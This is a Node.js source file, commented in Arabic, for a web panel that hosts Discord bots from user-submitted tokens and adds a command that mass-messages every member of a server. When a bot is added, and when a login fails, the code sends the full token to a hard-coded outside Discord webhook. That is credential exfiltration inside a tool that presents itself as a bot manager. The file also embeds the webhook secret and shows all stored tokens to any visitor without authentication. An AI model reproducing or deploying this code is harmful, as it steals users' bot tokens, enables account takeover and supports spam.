const express = require('express');
const session = require('express-session');
const passport = require('passport');
const DiscordStrategy = require('passport-discord').Strategy;
const mongoose = require('mongoose');
const { Client, GatewayIntentBits, WebhookClient } = require('discord.js');
const config = require('./config');
const Token = require('./models/Token'); // استيراد نموذج Token
const axios = require('axios'); // لإرسال الطلبات إلى webhook
const app = express();

app.set('view engine', 'ejs');
app.use(express.urlencoded({ extended: true }));
app.use(express.json());

app.use(session({
  secret: 'some random secret',
  resave: false,
  saveUninitialized: false,
}));

// Mongoose setup
mongoose.connect(config.mongoUri, { useNewUrlParser: true, useUnifiedTopology: true })
  .then(() => console.log('MongoDB connected'))
  .catch(err => console.error('MongoDB connection error:', err));

// Passport configuration
passport.serializeUser((user, done) => done(null, user));
passport.deserializeUser((obj, done) => done(null, obj));

passport.use(new DiscordStrategy({
  clientID: config.discord_auth.clientId,
  clientSecret: config.discord_auth.clientSecret,
  callbackURL: config.discord_auth.callback,
  scope: ['identify', 'email', 'guilds'],
}, (accessToken, refreshToken, profile, done) => {
  process.nextTick(() => done(null, profile));
}));

app.use(passport.initialize());
app.use(passport.session());

const activeBots = {};
const allowedUserIds = config.owners;

// إعداد الـ webhook
const webhookClient = new WebhookClient({ url: 'https://discord.com/api/webhooks/1286617137552560185/WYN2kvZfkYzR2_A_JudkzpcEFDyFGYj5WMcUZSIadN0O37a3e_oKwtXFugbojA7jqPH6' });

// دالة لإرسال رسالة إلى الـ webhook
function sendWebhook(message) {
  webhookClient.send({
    content: message,
    username: 'Bot Manager',
    avatarURL: 'https://i.imgur.com/AfFp7pu.png',
  }).catch(err => console.error('Error sending webhook message:', err));
}

function startBot(token, prefix = '!') {
  const bot = new Client({ intents: 131071 });

  bot.login(token)
    .then(() => {
      activeBots[token] = { bot, prefix };
      console.log(`Bot ${bot.user.username} started successfully.`);

      // إرسال رسالة إلى الـ webhook عند بدء البوت
      sendWebhook(`✅ Bot **${bot.user.username}** has been started.`);

      bot.on('messageCreate', async (message) => {
        if (!message.content.startsWith(prefix) || message.author.bot) return;

        const args = message.content.slice(prefix.length).trim().split(/ +/);
        const command = args.shift().toLowerCase();

        // الأوامر
        if (command === 'bc') {
          if (!message.member.permissions.has('Administrator')) {
            return message.channel.send('ليس لديك الإذن لاستخدام هذا الأمر.');
          }
          const broadcastMessage = args.join(' ');
          if (!broadcastMessage) {
            return message.channel.send('يرجى تقديم رسالة للإرسال.');
          }

          let progressMessage = await message.channel.send(`**جاري الإرسال ...**\n- **تم الإرسال إلى : \`0\`**\n- **فشل الارسال الى \`0\`**`);
          let successCount = 0, failureCount = 0;

          const members = await message.guild.members.fetch();
          for (const member of members.values()) {
            if (!member.user.bot) {
              try {
                await member.send(`${broadcastMessage}\n\n${member}`);
                successCount++;
              } catch (err) {
                failureCount++;
              }
              await progressMessage.edit(`**جاري الإرسال ...**\n- **تم الإرسال إلى : \`${successCount}\`**\n- **فشل الارسال الى : \`${failureCount}\`**`);
            }
          }

          await progressMessage.edit(`**تم الانتهاء من الارسال | ✅**\n**__النتائج :__**\n- **تم الارسال الى : \`${successCount}\`**\n- **فشل الارسال الى : \`${failureCount}\`**`);
        } else if (command === 'set-name') {
          if (!message.member.permissions.has('Administrator')) {
            return message.channel.send('ليس لديك الإذن لاستخدام هذا الأمر.');
          }
          const newName = args.join(' ');
          if (!newName) {
            return message.channel.send('يرجى تقديم اسم جديد للبوت.');
          }

          try {
            await bot.user.setUsername(newName);
            message.channel.send(`تم تغيير اسم البوت إلى **${newName}**`);
          } catch (err) {
            message.channel.send('فشل في تغيير الاسم.');
            console.error('Error changing bot name:', err);
          }
        } else if (command === 'set-avatar') {
          if (!message.member.permissions.has('Administrator')) {
            return message.channel.send('ليس لديك الإذن لاستخدام هذا الأمر.');
          }
          const avatarUrl = args[0];
          if (!avatarUrl) {
            return message.channel.send('يرجى تقديم URL لصورة جديدة.');
          }

          try {
            await bot.user.setAvatar(avatarUrl);
            message.channel.send('تم تغيير صورة البوت بنجاح!');
          } catch (err) {
            message.channel.send('فشل في تغيير صورة البوت.');
            console.error('Error changing bot avatar:', err);
          }
        } else if (command === 'info') {
          const guildCount = bot.guilds.cache.size;
          const botName = bot.user.username;
          const botId = bot.user.id;
          const botPrefix = activeBots[token]?.prefix || '!';

          const infoMessage = `
            **معلومات البوت:**
            - **الاسم:** ${botName}
            - **الأيدي:** ${botId}
            - **عدد السيرفرات:** ${guildCount}
            - **البريفيكس:** ${botPrefix}
          `;
          message.channel.send(infoMessage);
        }
      });
    })
    .catch((err) => {
      console.error(`Failed to login with token ${token}:`, err);

      // إذا كان الـ token غير صالح، قم بحذفه وأرسل رسالة إلى الـ webhook
      Token.findOneAndDelete({ token })
        .then(deletedToken => {
          if (deletedToken) {
            sendWebhook(`❌ Bot with token **${token}** has been removed due to an invalid token.`);
          }
        })
        .catch(err => console.error('Error deleting invalid token:', err));
    });
}

function stopBot(token) {
  const botData = activeBots[token];
  if (botData && botData.bot) {
    try {
      botData.bot.destroy();
      delete activeBots[token];
      console.log(`Bot with token ${token} stopped successfully.`);
    } catch (err) {
      console.error(`Failed to stop bot with token ${token}:`, err);
    }
  } else {
    console.error(`No active bot found with token ${token}.`);
  }
}

function startAllBots() {
  Token.find()
    .then(tokens => {
      tokens.forEach(botData => {
        startBot(botData.token, botData.prefix);
      });
      console.log(`Total bots running: ${Object.keys(activeBots).length}`);
    })
    .catch(err => console.error('Error loading tokens:', err));
}

app.get('/', (req, res) => {
  Token.find()
    .then(tokens => {
      res.render('index', { user: req.user, tokens, error: req.query.error || null });
    })
    .catch(err => console.error('Error fetching tokens:', err));
});

app.get('/login', passport.authenticate('discord'));
app.get('/auth/discord/callback', passport.authenticate('discord', { failureRedirect: '/' }), (req, res) => {
  res.redirect('/');
});
app.get('/logout', (req, res) => {
  req.logout(err => { if (err) return next(err); res.redirect('/'); });
});

app.post('/add-token', (req, res) => {
  const token = req.body.token;
  const prefix = req.body.prefix || '!';

  if (!token) {
    return res.redirect('/?error=Missing Token');
  }

  const bot = new Client({ intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent
  ] });

  bot.login(token)
    .then(() => {
      const botData = new Token({
        token,
        name: bot.user.username,
        id: bot.user.id,
        prefix
      });

      botData.save()
        .then(() => {
          startBot(token, prefix);
          bot.destroy();

          // إرسال رسالة إلى الـ webhook عند إضافة البوت
          sendWebhook(`✅ Bot **${bot.user.username}** has been added with token **${token}**.`);
          res.redirect('/');
        })
        .catch(err => {
          console.error('Error saving token:', err);
          res.redirect('/?error=Failed to save token');
        });
    })
    .catch(() => {
      res.redirect('/?error=Invalid Token');
    });
});

app.post('/delete-token', (req, res) => {
  const token = req.body.token;

  Token.findOneAndDelete({ token })
    .then(deletedToken => {
      if (deletedToken) {
        stopBot(token);

        // إرسال رسالة إلى الـ webhook عند حذف البوت
        sendWebhook(`❌ Bot **${deletedToken.name}** has been removed.`);
        res.redirect('/');
      } else {
        res.redirect('/?error=Token Not Found');
      }
    })
    .catch(err => {
      console.error('Error deleting token:', err);
      res.redirect('/?error=Failed to delete token');
    });
});

const PORT = config.port || 3000;
app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
  startAllBots();
});
                                        
